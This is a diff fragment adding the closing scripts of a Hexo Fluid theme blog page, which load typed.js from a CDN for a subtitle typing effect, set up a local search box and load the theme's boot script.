+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
